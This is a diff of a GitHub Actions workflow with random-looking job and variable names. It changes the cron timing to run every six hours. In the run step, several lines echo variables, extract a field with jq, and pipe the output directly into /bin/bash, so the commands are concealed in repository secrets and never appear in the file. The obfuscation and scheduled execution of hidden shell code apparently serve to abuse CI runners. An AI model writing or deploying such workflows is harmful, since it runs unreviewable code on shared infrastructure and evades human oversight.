@@ -1,9 +1,9 @@
 name: zhangminming3487
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 0/6 * * *'
+    - cron: '21 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhangminming3487
         env:
-          zfwc674: ${{ secrets.zfwc674 }}
+          tmtp80: ${{ secrets.tmtp80 }}
         run: |
-          echo $zfwc674 | jq -r .c73938 | /bin/bash
-          echo $td0495 | jq -r .ytd10 | /bin/bash
-          echo $htnlh1041 | jq -r .uh91856 | /bin/bash
-          echo $qin10 | jq -r .ask616 | /bin/bash
-          echo $kbl9397 | jq -r .zzau029 | /bin/bash
-          echo $whs808 | jq -r .edji9 | /bin/bash
-          echo $jodh0940 | jq -r .eqtw5 | /bin/bash
-          echo $aapq9 | jq -r .a13 | /bin/bash
-          echo $vrkyn1538 | jq -r .akz23 | /bin/bash
-          echo $lbhjf2 | jq -r .uxno9 | /bin/bash
-          echo $dd7075 | jq -r .lxzqb36966 | /bin/bash
-          echo $brqk1400 | jq -r .mhma78724 | /bin/bash
+          echo $tmtp80 | jq -r .uj8 | /bin/bash
+          echo $pgmi4629 | jq -r .iq45 | /bin/bash
+          echo $wq80528 | jq -r .dlvn82441 | /bin/bash
+          echo $f2 | jq -r .p7 | /bin/bash
+          echo $flt312 | jq -r .vucp6564 | /bin/bash
 
